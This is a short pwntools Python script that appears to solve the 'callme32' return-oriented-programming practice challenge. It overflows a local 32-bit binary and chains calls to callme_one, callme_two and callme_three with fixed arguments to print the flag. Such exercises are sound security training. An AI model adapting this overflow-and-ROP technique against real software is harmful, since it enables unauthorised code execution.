#!/usr/bin/env python3

from pwn import *

binary = ELF("./callme32")
context.binary = binary
rop = ROP(binary)

p = process(binary.path)
p.recvuntil(b">")

OFFSET = 44 
RET_ADDR = p32(0x80487f9)
ARG_1 = p32(0xdeadbeef)
ARG_2 = p32(0xcafebabe)
ARG_3 = p32(0xd00df00d)

rop.raw(b"A"*OFFSET)

for fun in ["callme_one", "callme_two", "callme_three"]:
    rop.raw(binary.symbols[fun])
    rop.raw(RET_ADDR)
    rop.raw(ARG_1)
    rop.raw(ARG_2)
    rop.raw(ARG_3)

p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[-2])
